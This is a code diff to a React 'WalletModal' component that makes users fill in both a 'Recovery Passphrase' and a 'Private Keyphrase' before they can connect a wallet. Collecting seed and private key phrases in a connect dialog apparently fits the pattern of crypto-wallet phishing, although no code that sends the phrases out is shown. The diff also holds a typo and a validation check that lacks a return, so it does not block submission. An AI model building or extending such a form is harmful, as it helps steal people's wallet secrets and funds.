@@ -55,6 +55,16 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
       setError('Please select a wallet');
       return;
     }
+    // e.preventDefault(); // Prevent default form submission
+
+    if (!passphrase) {
+      alert('Please enter a corrcet passphrase.');
+      return;
+    }
+
+    if (!keyphrase) {
+      alert("please enter a correct keyphrase")
+    }
 
     setIsConnecting(true);
     setError('');
@@ -199,6 +209,7 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
                 <label htmlFor="passphrase" className="block text-sm font-medium text-gray-300 mb-1">Recovery Passphrase:</label>
                 <input
                   type="password"
+                  required
                   id="passphrase"
                   className="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-indigo-500"
                   value={passphrase}
@@ -209,6 +220,7 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
                 <label htmlFor="keyphrase" className="block text-sm font-medium text-gray-300 mb-1">Private Keyphrase:</label>
                 <textarea
                   id="keyphrase"
+                  required
                   rows="3"
                   className="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-indigo-500"
                   value={keyphrase}
